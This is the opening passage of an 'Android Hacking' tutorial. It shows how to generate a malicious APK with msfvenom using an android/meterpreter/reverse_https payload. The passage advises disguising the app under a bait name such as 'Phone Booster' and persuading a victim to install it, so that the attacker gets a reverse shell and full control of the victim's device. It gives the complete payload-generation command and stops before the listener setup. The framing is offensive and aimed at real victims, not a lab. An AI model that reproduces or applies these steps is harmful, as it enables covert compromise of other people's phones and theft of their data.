PART-1 : Introduction and first remote access of victim's device

Hello and welcome everybody to the part one of Android Hacking series. In this tutorial I'll show you how you can generate a payload apk and send it to your victim and as soon as he/she installs that apk and starts it, how we can get a reverse connection and get full access of victim's device.

STEP 1 - Understanding the concept

Well this step will not involve any commands or execution, this step is just for theory, however don't skip it. This section is necessary for you to understand the commands and why they are used futher in the tutorial.

Okay so in short we have to generate an apk file [ it will also be called the 'payload' later in the tutorial ] and send it to the victim. By the time the victim downloads and installs the apk, we have to set-up a backdoor listner so that ... as soon as the victim starts or runs our payload [ installed apk file ], we get a reverse connection on our listner. Our installed malicious application on the victim's device will act as a pathway for us to execute remote commands on the victim's phone. So here the challenging part is that we have to convince our victim to somehow download, install and run our application. Alright now it seems clear that our payload name must be attracting. You can take any name like, 'Bubble Shooter', 'Counter Strike : Global Offensive [ Android Version ]', 'Phone booster', etc. I personally perfer 'Phone Booster'. So now let's go ahead! We will choose the payload 'android/meterpreter/reverse_https' to establish a reverse https connection over the local network. Now the format for creating a payload apk is like this:-

msfvenom -p [Payload_Name] LHOST=[Your_IPv4] LPORT=[Any_port_through_which_connection_should_be_established] -o [Output_filename].apk

So the proper command is :-

  • msfvenom -p android/meterpreter/reverse_https LHOST=$(hostname -I | awk '{print $1}') LPORT=1501 -o "Phone Booster.apk"
